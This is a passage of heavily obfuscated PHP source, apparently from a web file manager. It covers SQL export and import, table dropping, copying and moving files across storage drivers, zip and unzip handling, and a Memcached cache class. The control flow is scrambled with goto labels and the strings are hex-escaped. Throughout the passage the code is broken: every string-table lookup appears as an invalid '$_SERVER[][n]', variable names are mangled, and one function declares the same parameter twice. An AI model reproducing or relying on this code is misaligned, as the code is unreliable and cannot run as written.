$_SERVER[][1026])->selectPage($D, $bש͸); $bԵ׋ = isset($eҏ[$_SERVER[][362]][$_SERVER[][364]]) ? $eҏ[$_SERVER[][362]][$_SERVER[][364]] : 0; $bݟ = !empty($eҏ[$_SERVER[][365]]) ? $eҏ[$_SERVER[][365]] : array(); if (!($fգ = count($bݟ))) { break; } $a˪ = array(); foreach ($bݟ as $f) { if ($d֞ == $_SERVER[][1027] && $f[$_SERVER[][29]] == $_SERVER[][1028]) { $Aƒ = json_decode($f[$_SERVER[][370]], !0); if ($Aƒ[$_SERVER[][28]] == date($_SERVER[][726]) && !$Aƒ[$_SERVER[][725]]) { continue; } } if ($e) { $f[$_SERVER[][75]] = "\173\x69\x6f\x3a{$e}\175" . substr($f[$_SERVER[][75]], strlen("\173\x69\157\72{$f[$_SERVER[][783]]}\x7d")); $f[$_SERVER[][783]] = $e; } $a˪[] = $_SERVER[][1029] . $this->sqlEncode($f) . $_SERVER[][1030]; } $F삔 = "\x49\116\123\105\x52\124\x20\111\x4e\124\x4f\x20\x60{$d֞}\140\40\x28\x60" . implode($_SERVER[][1031], $bˏ뽜) . $_SERVER[][1032]; fwrite($Bɫ, $F삔 . implode($_SERVER[][1033], $a˪) . $_SERVER[][67] . PHP_EOL); $bש͸++; $b䭌ۛ += $fգ; if ($Fᑊ) { $Fᑊ->update($fգ); } } while ($bש͸ <= $bԵ׋); goto f䕝; Eώ: } public function sqlToDb($b씕, $Eߺ = null) { goto Dʭ; Dʭ: $E⌺ڐ =& $_SERVER[]; $cԤޠ = $this->model()->db(); $f = @fopen($b씕, $E⌺ڐ[1034]); goto Aػҏ; bϬ: $f = 500 + 1; while (!feof($f)) { if ($Eߺ && $b != 0) { $Eߺ->task[$E⌺ڐ[1021]] += 1; } $b++; $eĥΒ = trim(fgets($f)); $A֘ .= $E⌺ڐ[50] . $this->sqlDecode($eĥΒ, $this->type); if ($b == $f) { $A֘ = rtrim(trim($A֘), $E⌺ڐ[67]); if (!$cԤޠ->execute($A֘)) { return !1; } if ($Eߺ) { $Eߺ->update($b - 1); } $A֘ = $E⌺ڐ[33]; $b = 0; } } fclose($f); goto Dˆ; Aػҏ: if (!$f) { return !1; } $b = 0; $A֘ = $E⌺ڐ[33]; goto bϬ; Dˆ: if (trim($A֘)) { $A֘ = rtrim(trim($A֘), $E⌺ڐ[67]); if (!$cԤޠ->execute($A֘)) { return !1; } if ($Eߺ) { $Eߺ->update($b - 1); } } return !0; goto C啝; C啝: } public function dropTable($bޭ = null) { $E֊ = $this->model()->db(); $DϞ = $bޭ ? array($bޭ) : $E֊->getTables(); if (!$DϞ) { return; } foreach ($DϞ as $bޭ) { $E֊->execute("\x64\x72\x6f\x70\40\x74\x61\x62\154\145\x20\x69\x66\x20\145\170\x69\x73\164\x73\x20\x60{$bޭ}\140"); } } private function taskToCache($DƷ = null) { $B =& $_SERVER[]; if (!$DƷ) { return; } $eл = array($B[1023] => $DƷ->task[$B[1023]], $B[1021] => $DƷ->task[$B[1021]], $B[1035] => $DƷ->task[$B[1035]]); if ($eл[$B[1021]] == $eл[$B[1035]]) { $eл[$B[732]] = 1; } Cache::set($B[1036] . $DƷ->task[$B[388]], $eл); $DƷ->end(); } private function sqlEncode($A߈) { $A徂̘ =& $_SERVER[]; $e٨ = array(); foreach ($A߈ as $A؞) { if (is_array($A؞)) { $A؞ = json_encode_force($A؞); } $A؞ = addslashes($A؞); $A؞ = str_replace(array($A徂̘[1037], $A徂̘[227]), array($A徂̘[1038], $A徂̘[1039]), $A؞); $e٨[] = str_replace($A徂̘[55], $A徂̘[1040], $A؞); } return $A徂̘[55] . implode($A徂̘[1041], $e٨) . $A徂̘[55]; } private function sqlDecode($eㆨ, $CǶ) { $a =& $_SERVER[]; $eㆨ = str_replace(array($a[1038], $a[1039]), array($a[1037], $a[227]), $eㆨ); if ($CǶ == $a[9]) { $eㆨ = stripslashes($eㆨ); } return $eㆨ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Fԅ, $Cή) { goto D; D: $c󮿺 =& $_SERVER[]; $AН = $Cή; $GLOBALS[$c󮿺[1042]] = $c󮿺[1043] . $Fԅ; goto E; e: Hook::trigger($c󮿺[1043] . $Fԅ . $c󮿺[1046], $AН, $E); return $E; goto Cǐȫ; E: Hook::trigger($c󮿺[1043] . $Fԅ . $c󮿺[1044], $AН); $aӬ = self::driverMake($Cή[0]); if (method_exists($aӬ, $Fԅ)) { $E = @call_user_func_array(array($aӬ, $Fԅ), $Cή); } else { if (method_exists($aӬ, $c󮿺[1045])) { $E = @call_user_func_array(array($aӬ, $Fԅ), $Cή); } else { if (method_exists(self, $Fԅ)) { $E = @call_user_func_array(array(self, $Fԅ), $Cή); } else { $E = call_user_func_array(array(parent, $Fԅ), $Cή); } } } goto e; Cǐȫ: } public static function init($B¬) { return self::driverMake($B¬); } public static function copy($cۍו, $d, $c = false, $EԃȎ = false) { return self::copyMoveStart($cۍו, $d, $c, $_SERVER[][513], $EԃȎ); } public static function move($cί, $C٢⑊, $F֓ = false, $f슢 = false) { return self::copyMoveStart($cί, $C٢⑊, $F֓, $_SERVER[][515], $f슢); } private static function copyMoveStart($Eɻލ, $aˇ, $D, $b, $BȐɍ) { $Fخ酾 =& $_SERVER[]; $DɈ = array($Eɻލ, $aˇ, $D, $BȐɍ); Hook::trigger($Fخ酾[1043] . $b . $Fخ酾[1044], $DɈ); $cֲ፼ = self::copyMove($Eɻލ, $aˇ, $D, $b, $BȐɍ); Hook::trigger($Fخ酾[1043] . $b . $Fخ酾[1046], $DɈ, $cֲ፼); return $cֲ፼; } public static function saveFile($DȪ״, $b͑ʏ, $BŖÔ = true) { goto C; bآ: $aˢ = self::driverMake($b͑ʏ); $Aȅ = !1; if ($aˢ->pathParse[$e뤏[1047]]) { $eɄ = $aˢ->pathParse[$e뤏[1047]]; $Aȅ = $aˢ; $aˢ = self::driverMake($eɄ); } goto Dܫ; a찓: $a๨ȇ = self::copyFile($AؘϾͿ, $DȪ״, $aˢ, $EĆ, $f[$e뤏[28]], $c䥡޶); if ($Aȅ) { $a๨ȇ = $Aȅ->getPathOuter($a๨ȇ); } return $a๨ȇ; goto cϯΕ; C: $e뤏 =& $_SERVER[]; $f = self::info($b͑ʏ); $AؘϾͿ = self::driverMake($DȪ״); goto bآ; Dܫ: $EĆ = $aˢ->pathFather($b͑ʏ); $c䥡޶ = !0; if (!$BŖÔ && self::driverIsSame($AؘϾͿ, $aˢ)) { $c䥡޶ = !1; } goto a찓; cϯΕ: } private static function copyMove($D׍ڏ, $fϪ, $dޏ, $a߿, $dώ = false) { goto c͆; B˨: $a = !1; if ($D->pathParse[$FÊ[1047]]) { $fϪ = $D->pathParse[$FÊ[1047]]; $a = $D; $D = self::driverMake($fϪ); } self::check($b߃ճ, $D׍ڏ, $D, $fϪ); goto b˳ϊ; c͆: $FÊ =& $_SERVER[]; if (!$D׍ڏ || $D׍ڏ == $FÊ[8] || !$fϪ) { return !1; } ignore_timeout(); goto aܯ; b˳ϊ: Hook::trigger($FÊ[72], $b߃ճ, $D׍ڏ, $D, $fϪ); $bԫ̨ = self::driverIsSame($b߃ճ, $D); if ($bԫ̨) { if ($a߿ == $FÊ[515] && !method_exists($D, $FÊ[1048]) && trim($fϪ, $FÊ[8]) == trim($D->pathFather($D׍ڏ), $FÊ[8])) { if ($b߃ճ->pathThis($D׍ڏ) != $dώ && !$b߃ճ->isTypeObject()) { return $b߃ճ->rename($D׍ڏ, $dώ); } return $D->getPathOuter($D׍ڏ); } if (method_exists($D, $a߿)) { return $D->{$a߿}($D׍ڏ, $fϪ, $dޏ); } } goto Cͳ; Cͳ: $eǇ = $b߃ճ->isFile($D׍ڏ); if (!$eǇ && $D->getType() == $FÊ[730] && $b߃ճ->getType() == $FÊ[105]) { $f = $D->copyFolderFromIO($b߃ճ, $D׍ڏ, $fϪ, $dޏ, $E, $dώ); } else { $f = self::copyPath($b߃ճ, $D׍ڏ, $D, $fϪ, $dޏ, $E, $eǇ, $dώ); } if ($f && $E) { $b߃ճ->remove($D׍ڏ); } goto e̞; e̞: if ($a) { $f = $a->getPathOuter($f); } return $f; goto e; aܯ: $b߃ճ = self::driverMake($D׍ڏ); $D = self::driverMake($fϪ); $E = $a߿ == $FÊ[515]; goto B˨; e: } private static function check($a݉̆, $Fʝ, $Aэ, &$Cݦ) { $Eх =& $_SERVER[]; if (self::driverIsSame($a݉̆, $Aэ) && $a݉̆->isFolder($Fʝ) && $a݉̆->isParentOf($Fʝ, $Cݦ)) { show_json(LNG($Eх[1049]), !1); } if (!$a݉̆->exist($Fʝ)) { show_json(LNG($Eх[104]), !1); } } private static function copyPath($fԣ, $E缐, $eɶ, $eߕ, $Cŵ, $a, $d, $d铱ؽ = false) { goto f; AතĐ: $cì = $eɶ->mkdir($eɶ->getPath($F)); $eߕ = $eɶ->getPathInner($cì); $eŷ = $fԣ->listPath($E缐, !0); goto C㞞; C㞞: $D厾ϕ = array_merge($eŷ[$aꛔ[73]], $eŷ[$aꛔ[74]]); foreach ($D厾ϕ as $cک) { $Dӗ = $cک[$aꛔ[29]] == $aꛔ[173]; $E缐 = $fԣ->getPathInner($cک[$aꛔ[75]]); $Aڦ = self::copyPath($fԣ, $E缐, $eɶ, $eߕ, $Cŵ, $a, $Dӗ); if (!$Aڦ) { IO::errorTips($aꛔ[1050] . $E缐 . $aꛔ[66] . $eߕ); } } return $cì; goto cꄻ; f: $aꛔ =& $_SERVER[]; $eȉҠ = $d铱ؽ ? $d铱ؽ : $fԣ->pathThis($E缐); if ($Cŵ) { $f = $eɶ->fileNameExist($eߕ, $eȉҠ); $eȉҠ = $eɶ->fileNameAuto($eߕ, $eȉҠ, $Cŵ, !$d); $Cŵ = $f ? $Cŵ : !1; } goto f΄¨; f΄¨: if ($d) { return self::copyFile($fԣ, $E缐, $eɶ, $eߕ, $eȉҠ, $a); } if ($Cŵ == REPEAT_RENAME_FOLDER) { $Cŵ = !1; } $F = rtrim($eߕ, $aꛔ[8]) . $aꛔ[8] . $eȉҠ; goto AතĐ; cꄻ: } private static function copyFile($e삂, $aѭʤ, $E, $b, $E, $F岟ɗ) { goto a; E: Hook::trigger($AЃ[1053], $e삂, $aѭʤ, $E, $b, $E, $F); return $F; goto dߝ; a: $AЃ =& $_SERVER[]; $b = $E->getPath(rtrim($b, $AЃ[8]) . $AЃ[8] . $E); $F = $AЃ[1051] . time() . rand_string(5); goto B̴ヌ; fɄų: $Dڇ = $e삂->iconvApp($Dڇ); $F = $E->upload($b, $Dڇ, $F岟ɗ); self::remove($E󜦈 . $F); goto E; e찅: mk_dir($E󜦈); $Dڇ = $E󜦈 . $F; $Dڇ = $e삂->download($aѭʤ, $Dڇ); goto fɄų; B̴ヌ: Hook::trigger($AЃ[1052], $e삂, $aѭʤ, $E, $b, $E, $F); if (self::driverIsSame($e삂, $E)) { if ($F岟ɗ) { $F = $E->moveFile($aѭʤ, $b); } else { $F = $E->copyFile($aѭʤ, $b); } Hook::trigger($AЃ[1053], $e삂, $aѭʤ, $E, $b, $E, $F); return $F; } $E󜦈 = TEMP_FILES; goto e찅; dߝ: } public static function pathFather($E) { $d = IO::init($E); $d = $d->pathFather($d->path); return $d->getPathOuter($d); } public static function fileOut($Eľ, $B = false, $a = false, $d騇 = '') { $bЙ = self::driverMake($Eľ); if ($bЙ->isFileOutServer()) { return $bЙ->fileOutServer($Eľ, $B, $a, $d騇); } return $bЙ->fileOut($Eľ, $B, $a, $d騇); } public static function fileOutImage($dٍ, $dè = 250) { $B = array(250, 600, 1200, 3000, 5000); for ($F֟ = 0; $F֟ < count($B); $F֟++) { if ($F֟ == 0 && $dè <= $B[$F֟]) { $dè = $B[$F֟]; break; } else { if ($dè > $B[$F֟ - 1] && $dè <= $B[$F֟]) { $dè = $B[$F֟]; break; } else { if ($F֟ == count($B) - 1 && $dè > $B[$F֟]) { $dè = $B[$F֟]; break; } } } } $E = self::driverMake($dٍ); if ($E->isFileOutServer()) { return $E->fileOutImageServer($dٍ, $dè); } return $E->fileOutImage($dٍ, $dè); } private static function driverIsSame($B, $D) { goto C刣ѧ; C刣ѧ: $Aߔ =& $_SERVER[]; $d׎ = $B->getType(); $BԼ = $D->getType(); goto F; F: if ($d׎ != $BԼ) { return !1; } if ($d׎ == $Aߔ[730]) { return !0; } if ($d׎ == $Aߔ[105]) { return !0; } goto Cˢ; Cˢ: if ($B->pathDriver == $D->pathDriver) { return !0; } return !1; goto e; e: } public static function copyUpdate($Eϫ, $dӟ) { goto B𵘗; c׊׽: $f⋥ = self::_listAll($Eϫ); $F = self::_listAll($dӟ); $dթ = array(); goto C늠; C늠: $D = array(); foreach ($f⋥ as $dР => $Bկ) { if (isset($F[$dР])) { if ($Bկ[$BӪ[76]] == 1) { continue; } if ($F[$dР][$BӪ[77]] == $Bկ[$BӪ[77]]) { continue; } } if ($Bկ[$BӪ[76]] == 1) { $D[] = $dӟ . $BӪ[8] . $dР; continue; } $fޤ = strstr(trim($dР, $BӪ[8]), $BӪ[8]) ? get_path_father($dР) : $BӪ[33]; $dթ[] = array($BӪ[1054] => $Bկ[$BӪ[75]], $BӪ[1055] => rtrim($dӟ, $BӪ[8]) . $BӪ[8] . $fޤ, $BӪ[1056] => $Bկ); } $dى = array($BӪ[173] => $dթ, $BӪ[76] => $D); goto E; B𵘗: $BӪ =& $_SERVER[]; if (!IO::exist($Eϫ)) { return !1; } if (!IO::exist($dӟ)) { IO::mkdir($dӟ); } goto c׊׽; E: Hook::trigger($BӪ[1057], $Eϫ, $dӟ, $dى); foreach ($D as $Bկ) { IO::mkdir($Bկ); } foreach ($dթ as $Bկ) { IO::copy($Bկ[$BӪ[1054]], $Bկ[$BӪ[1055]], REPEAT_REPLACE); } goto fˊσ; fˊσ: } private static function _listAll($cˮ) { $F =& $_SERVER[]; $cˮ = KodIO::clear($cˮ); $C쟇 = IO::listAll($cˮ); foreach ($C쟇 as &$fʹ) { $e = substr($fʹ[$F[75]], strlen($cˮ)); $fʹ[$F[1058]] = trim($e, $F[8]); } unset($fʹ); return array_to_keyvalue($C쟇, $F[1058]); } public static function fileSubstr($eӚ, $Bބ, $d񥏅 = false) { goto fᄈ; fᄈ: $c =& $_SERVER[]; $bܩ = self::driverMake($eӚ); $D߆Ȉ = $bܩ->size($eӚ); goto bӤի; e­ێ: if ($d񥏅 <= 0) { return $c[33]; } if ($Bބ < 0 || $Bބ >= $D߆Ȉ || $d񥏅 > 1024 * 1024 * 5) { throw new Exception("\146\151\154\145\122\145\141\x64\x20\x65\x72\x72\x6f\x72\41\40\163\x74\141\x72\164\75{$Bބ}\x3b\154\x65\x6e\x67\x74\150\x3d{$d񥏅}\x3b\x20\163\x69\x7a\x65\x3d{$D߆Ȉ}\x3b"); } $D = $bܩ->fileSubstr($eӚ, $Bބ, $d񥏅); goto eƺ; bލۅ: if ($d񥏅 === !1) { $d񥏅 = $D߆Ȉ - $Bބ; } if ($Bބ + $d񥏅 > $D߆Ȉ) { $d񥏅 = $D߆Ȉ - $Bބ; } if (!$D߆Ȉ && $bܩ->getType() == $c[105] && !$bܩ->exist($eӚ)) { throw new Exception($c[1059] . LNG($c[1060]) . $c[924] . get_path_this($eӚ) . $c[33]); } goto e­ێ; eƺ: if (!$D && $d񥏅 && isset($GLOBALS[$c[1061]])) { throw new Exception($GLOBALS[$c[1061]][$c[1062]]); } return $D; goto D¾; bӤի: $bݻ = $Bބ; $f˗ = $d񥏅; if ($Bބ < 0) { $Bބ = $D߆Ȉ + $Bބ; } goto bލۅ; D¾: } private static function driverMake(&$EЯ) { goto d㩂; a: return $a䧍ۼ; goto B; cܶޏ: if ($c[$b۱[29]] == KodIO::KOD_IO && !self::$driverListSystem[$c[$b۱[388]]]) { return !1; } $EЯ = $c[$b۱[1063]]; $a䧍ۼ = self::driverGet($c, $EЯ); goto a; d㩂: $b۱ =& $_SERVER[]; $c = KodIO::parse($EЯ); if (!self::$driverListSystem) { $Dܯ˫ = Model($b۱[739])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Dܯ˫, $b۱[388]); } goto cܶޏ; B: } private static function driverGet($bݘǐ, &$fŜ) { goto B; B: $bй =& $_SERVER[]; $cݏ = $bݘǐ[$bй[1064]]; $b = $bݘǐ[$bй[388]]; goto Fѥ; dǍ: if (isset($Bփ[$bй[6]][$bй[1075]])) { $E->pathBase = rtrim($Bփ[$bй[6]][$bй[1075]], $bй[8]) . $bй[8]; $fŜ = $E->pathBase . ltrim($fŜ, $bй[8]); } $fŜ = $E->getPath($fŜ); if (isset($bݘǐ[$bй[1047]])) { $fŜ = $bݘǐ[$bй[1047]]; } goto bӨ; E: $E = self::$driverCache[$Fؐ]; $E->pathDriver = $cݏ; $E->pathBase = $bй[33]; goto dǍ; bӨ: $E->path = $fŜ; return $E; goto B򰩊; Fѥ: switch ($bݘǐ[$bй[29]]) { case KodIO::KOD_IO: $Bփ = self::$driverListSystem[$b]; break; case KodIO::KOD_SOURCE: $fŜ = $b . $fŜ; $Bփ = array($bй[1065] => $bй[1066], $bй[6] => $bݘǐ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Eˠ = $GLOBALS[$bй[1067]]; self::$driverListUser = array_to_keyvalue($Eˠ, $bй[388]); } $Bփ = self::$driverListUser[$b]; break; case KodIO::KOD_SHARE_LINK: $Bփ = array($bй[1065] => $bй[1068], $bй[6] => $bݘǐ); $Cϛ = Action($bй[1069])->sharePathInfo($bݘǐ[$bй[75]]); $fŜ = $Cϛ[$bй[390]]; if (!$Cϛ[$bй[390]]) { $BǦ = Model($bй[558])->getInfo($Cϛ[$bй[462]]); $fŜ = KodIO::clear($BǦ[$bй[1070]] . $bݘǐ[$bй[1063]]); $bݘǐ[$bй[460]] = $BǦ; $bݘǐ[$bй[1047]] = $fŜ; $Bփ = array($bй[1065] => $bй[1071], $bй[6] => $bݘǐ); } break; case KodIO::KOD_SHARE_ITEM: $Bփ = array($bй[1065] => $bй[1072], $bй[6] => $bݘǐ); $BǦ = Model($bй[558])->getInfo($bݘǐ[$bй[388]]); if ($BǦ[$bй[390]] == $bй[491]) { $fŜ = KodIO::clear($BǦ[$bй[1070]] . $bݘǐ[$bй[1063]]); $bݘǐ[$bй[460]] = $BǦ; $bݘǐ[$bй[1047]] = $fŜ; $Bփ = array($bй[1065] => $bй[1073], $bй[6] => $bݘǐ); } else { if (!$fŜ) { $fŜ = $BǦ[$bй[390]]; } } break; default: $fŜ = $bݘǐ[$bй[75]]; $Bփ = array($bй[1065] => $bй[1074]); break; } $Fؐ = $bݘǐ[$bй[75]]; if (!isset(self::$driverCache[$Fؐ])) { $A = strtolower($Bփ[$bй[93]]); $Eͥ؏ = $GLOBALS[$bй[6]][$bй[87]][$bй[791]]; $B = $bй[71] . (isset($Eͥ؏[$A]) ? $Eͥ؏[$A] : ucfirst($A)); if (!class_exists($B)) { show_json("{$B}\x20\156\x6f\164\40\x65\170\151\x73\x74\x73\x21", !1); } $c = isset($Bփ[$bй[6]]) ? $Bփ[$bй[6]] : !1; self::$driverCache[$Fؐ] = new $B($c); } goto E; B򰩊: } public static function errorTips($Eݿ = false) { goto a鏃; a鏃: $A碌ڱ =& $_SERVER[]; static $c = array(); $aǇⅱ = 1000; goto b; c퓫: $c[] = $Eݿ; write_log($A碌ڱ[159] . ACTION . $A碌ڱ[1076] . $Eݿ, $A碌ڱ[1077]); goto aԇ; b: if ($Eݿ === -1) { return $c ? $c[count($c) - 1] : $A碌ڱ[33]; } if ($Eݿ === !1) { return implode($A碌ڱ[227], $c); } if (count($c) >= $aǇⅱ) { $c = array_slice($c, $aǇⅱ * 0.5, $aǇⅱ); } goto c퓫; aԇ: } public static function getLastError($Eة = '') { $e֙ƨ = self::errorTips(-1); return $e֙ƨ ? $e֙ƨ : $Eة; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $c♌; if (!$c♌) { $F͊ = IO::init($_SERVER[][8]); } return $F͊; } private static function iconvSystem($eʙ) { return self::local()->iconvSystem($eʙ); } private static function iconvApp($eУ) { return self::local()->iconvApp($eУ); } public static function zip($B, $Bں = "\x7a\151\x70", $B󫃬 = '', $F׆ = REPEAT_RENAME) { goto E; bڇ: foreach ($Dߎ as $e => $FۆƼ) { $Dߎ[$e] = self::iconvSystem($FۆƼ); } KodArchive::create($Dū, $Dߎ); if (!IO::exist($A)) { if ($A) { del_dir($A); } show_json(LNG($eɮ[1080]), !1); } goto Eҗ; c܈: if (count($Dߎ) > 1) { $fʷɛ = IO::info(IO::pathFather($fÌ[$eɮ[75]])); $C = $fʷɛ[$eɮ[28]]; } $B΃ = $A; if (!$B΃) { $B΃ = get_path_father($fÌ[$eɮ[75]]); if (!$B󫃬 && $bǌ->getType() == $eɮ[105]) { $B΃ = get_path_father($bǌ->path); } $d肭 = IO::info($B΃); if (!$d肭[$eɮ[194]]) { show_json(LNG($eɮ[1079]), !1); } } goto C; Eҗ: if ($B󫃬 || !$A) { if ($A && strstr($A, TEMP_FILES)) { $c = $Dߎ = array(); recursion_dir($B΃, $c, $Dߎ, 0); foreach ($c as $f) { del_dir($f); } foreach ($Dߎ as $dڟ֤) { if ($dڟ֤ == $Dū) { continue; } del_file($dڟ֤); } } return $A; } $Cʭ彬 = self::pathFather($fÌ[$eɮ[75]]); $B⌵å = self::move($A, $Cʭ彬, $F׆); goto B߳; FÕ: $A = !1; if (!$B󫃬 && $bǌ->getType() == $eɮ[105]) { $Dߎ = self::zipFileList($B); } else { $A = $B󫃬 ? $B󫃬 : TEMP_FILES . $eɮ[1078] . time() . rand_string(8) . $eɮ[8]; mk_dir($A); $Dߎ = self::zipFileList($B, $A); } $C = $fÌ[$eɮ[28]]; goto c܈; B߳: if (!$B⌵å) { del_dir($A); show_json(LNG($eɮ[1080]), !1); } del_dir($A); return $B⌵å; goto E컛; E: $eɮ =& $_SERVER[]; $bǌ = self::init($B[0][$eɮ[75]]); $fÌ = self::info($B[0][$eɮ[75]]); goto FÕ; C: $A = $B΃ . $C . $eɮ[94] . $Bں; $A = get_filename_auto($A, $eɮ[33], $F׆); $Dū = self::iconvSystem($A); goto bڇ; E컛: } public static function unzip($A֬, $A׊䎕 = "\x72\x65\160\154\x61\143\x65") { goto dʍ; Eƥ: if (!($E؋ = parent::info($aƌ))) { show_json(LNG($dν[1082]), !1); } if (!($e = parent::infoFull($C۝))) { $C۝ = parent::mkdir($C۝); $e = array($dν[75] => $C۝); } else { if (isset($e[$dν[390]]) && trim($e[$dν[75]], $dν[8]) != trim($C۝, $dν[8])) { $fݔ = KodIO::make($e[$dν[472]]); $a酱 = parent::fileNameAuto($fݔ, $e[$dν[28]], REPEAT_RENAME_FOLDER, !0); $C۝ = parent::mkdir($fݔ . $a酱); $e = array($dν[75] => $C۝); } } $C۝ = $e[$dν[75]]; goto cͣ; a: if (!@file_exists(self::iconvSystem($f񓴓))) { $b = self::localFilePath($aƌ, $B); $f񓴓 = $b ? $b : parent::download($aƌ, $f񓴓); } $f񓴓 = self::iconvSystem($f񓴓); $Cܘ = isset($A֬[$dν[1083]]) ? $A֬[$dν[1083]] : $dν[1084]; goto fᨒ; c˟: mk_dir($D); $B = self::fileExt($E؋); $f񓴓 = $D . $dν[94] . $B; goto a; d: foreach ($fϞȥ as $EՙІ) { $EՙІ = self::iconvApp($EՙІ); self::move($EՙІ, $C۝, $A׊䎕); } del_dir($D); if (!$b) { del_file($f񓴓); } goto a˼; fᨒ: $D쮺 = KodArchive::extract($f񓴓, $D . $dν[8], $Cܘ); self::archiveExt(); if (!$D쮺[$dν[1085]]) { show_json($dν[1086] . $D쮺[$dν[1087]], !1); } goto Bҍί; cͣ: $b = self::tmpFileName($E؋); $D = TEMP_FILES . $b; del_dir($D); goto c˟; a˼: return !0; goto B; dʍ: $dν =& $_SERVER[]; $aƌ = $A֬[$dν[75]]; $C۝ = $A֬[$dν[1081]]; goto Eƥ; Bҍί: Hook::trigger($dν[1088], $D); recursion_dir($D, $E򋼴, $F, 0); $fϞȥ = array_merge($E򋼴, $F); goto d; B: } public static function unzipList($bޤڙ) { goto cϚ; f: self::archiveExt(); del_dir($D); if (!$Cī[$C轪暢[1085]]) { show_json($Cī[$C轪暢[1087]], !1); } goto F匞; F匞: $CҔշ = json_encode($Cī[$C轪暢[1087]]); self::setContent($E˘, $CҔշ); if (count($Cī[$C轪暢[1087]]) >= $cᒉ) { show_json(sprintf(LNG($C轪暢[1091]), count($Cī[$C轪暢[1087]])), !1); } goto f; Bޑу: $E̙ͧ = self::iconvSystem($E̙ͧ); if ($c֠ >= 0) { $eŒ = isset($bޤڙ[$C轪暢[1093]]) ? $bޤڙ[$C轪暢[1093]] : !1; $dڶ̖ = isset($bޤڙ[$C轪暢[28]]) ? $bޤڙ[$C轪暢[28]] : $C轪暢[33]; KodArchive::filePreview($E̙ͧ, $c֠, $eŒ, $dڶ̖); self::archiveExt(); die; } $Cī = KodArchive::listContent($E̙ͧ); goto f; F̹: if (!is_dir($D)) { mk_dir($D); } $E̙ͧ = $D . $C轪暢[8] . $Cƭ; if (!@file_exists(self::iconvSystem($E̙ͧ))) { if (isset($c悎)) { url_request($fح, $C轪暢[1092], $E̙ͧ); } else { $d̠췚 = self::localFilePath($fح, $Eǚ); $E̙ͧ = $d̠췚 ? $d̠췚 : self::download($fح, $E̙ͧ); } } goto Bޑу; Cю: $cᒉ = 50000; if (request_url_safe($fح)) { $c悎 = parse_url_query($fح); if (!isset($c悎[$C轪暢[75]])) { show_json($C轪暢[1090], !1); } } $b˾ՠ = isset($c悎) ? $c悎[$C轪暢[75]] : $fح; goto a; f: return $Cī[$C轪暢[1087]]; goto b; B: if (isset($c悎)) { $e犏 = array($c悎[$C轪暢[75]], $c悎[$C轪暢[1089]], $c悎[$C轪暢[28]]); $Cƭ = md5(implode($C轪暢[70], $e犏)) . $C轪暢[94] . get_path_ext($c悎[$C轪暢[28]]); } else { $e犏 = array($d[$C轪暢[28]], $d[$C轪暢[75]], $d[$C轪暢[77]]); $Cƭ = md5(implode($C轪暢[70], $e犏)) . $C轪暢[94] . $Eǚ; } if ($c֠ == -1) { $E˘ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\x56\151\x65\x77\x2f{$C}\57{$Cƭ}\x2e\154\x6f\147"; $d팈 = self::infoFull($E˘); if ($d팈) { $E˘ = $d팈[$C轪暢[75]]; $fٍ = self::getContent($E˘); if ($fٍ) { $CҔշ = json_decode($fٍ, !0); if (count($CҔշ) >= $cᒉ) { show_json(sprintf(LNG($C轪暢[1091]), count($CҔշ)), !1); } return $CҔշ; } } else { $E˘ = self::mkfile($E˘); } } $D = TEMP_FILES . $C; goto F̹; cϚ: $C轪暢 =& $_SERVER[]; $fح = $bޤڙ[$C轪暢[75]]; $c֠ = isset($bޤڙ[$C轪暢[1089]]) ? $bޤڙ[$C轪暢[1089]] : -1; goto Cю; a: $d = self::info($b˾ՠ); $Eǚ = self::fileExt($d); $C = self::tmpFileName($d); goto B; b: } private static function fileExt($C֖) { $Aޒ =& $_SERVER[]; $E߫ = $C֖[$Aޒ[167]]; if ($E߫ == $Aޒ[1094]) { $Fߌ = $Aޒ[1095]; if (substr($C֖[$Aޒ[28]], -strlen($Fߌ)) == $Fߌ) { $E߫ = $Aޒ[1096]; } } self::archiveExt($E߫); return $E߫; } private static function zipFileList($AԲ, $b = false) { $eɶ =& $_SERVER[]; $Cш = array(); foreach ($AԲ as $Bŉ) { $D = $Bŉ[$eɶ[75]]; if ($b) { $D = self::copy($Bŉ[$eɶ[75]], $b, $eɶ[784]); } else { $F = self::init($Bŉ[$eɶ[75]]); if ($F->getType() == $eɶ[105]) { $D = $F->path; } } if ($D && self::local()->exist($D)) { $Cш[$Bŉ[$eɶ[75]]] = $D; } } if (!empty($Cш)) { return array_values($Cш); } show_json(LNG($eɶ[1060]), !1); } public static function tmpFileName($B) { $Cܞ =& $_SERVER[]; $D = array($B[$Cܞ[28]], $B[$Cܞ[75]], $B[$Cܞ[77]], $B[$Cܞ[481]]); return md5(implode($Cܞ[70], $D)); } private static function localFilePath($C, $b٦) { goto FȘ; F͓: if ($d҅ == $E[105] || $d҅ == $E[1100]) { if (!$C->exist($C->path)) { show_json(LNG($E[104]), !1); } return $C->path; } return !1; goto cܞ; FȘ: $E =& $_SERVER[]; if ($b٦ == $E[1097] && strtoupper(substr(PHP_OS, 0, 3)) == $E[1098]) { return !1; } $Dᙾ = KodIO::parse($C); goto d˝; d˝: if ($Dᙾ[$E[29]] == KodIO::KOD_SOURCE) { $CΪà = Model($E[790])->fileInfoGet(KodIO::sourceID($C)); if (!$CΪà[$E[75]]) { show_json($E[1099], !1); } $C = $CΪà[$E[75]]; } $C = self::init($C); $d҅ = $C->getType(); goto F͓; cܞ: } private static function archiveExt($F = '') { $GLOBALS[$_SERVER[][1101]] = $F; } } goto A،; f: define($_SERVER[][0], $_SERVER[][1]); $_SERVER[] = explode($_SERVER[][2], gzinflate(substr($_SERVER[][3], 10, -8))); function binCheckEq($B͠ډ, $A) { return $B͠ډ == $A; } goto Bӊ; eِ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($d؉, $A鐢) { $Eӝ =& $_SERVER[]; if (!class_exists($Eӝ[829])) { show_json($Eӝ[830], !1); } $this->cacheTime = $A鐢; $this->handle = new Memcached(); if (is_array($d؉[$Eӝ[831]]) && count($d؉[$Eӝ[831]]) >= 1) { foreach ($d؉[$Eӝ[831]] as $eÏ) { $aୢ = explode($Eӝ[4], $eÏ); $this->handle->addServer($aୢ[0], $aୢ[1]); } } else { $this->handle->addServer($d؉[$Eӝ[175]], $d؉[$Eӝ[176]]); } } public function set($Eߒʝ̇, 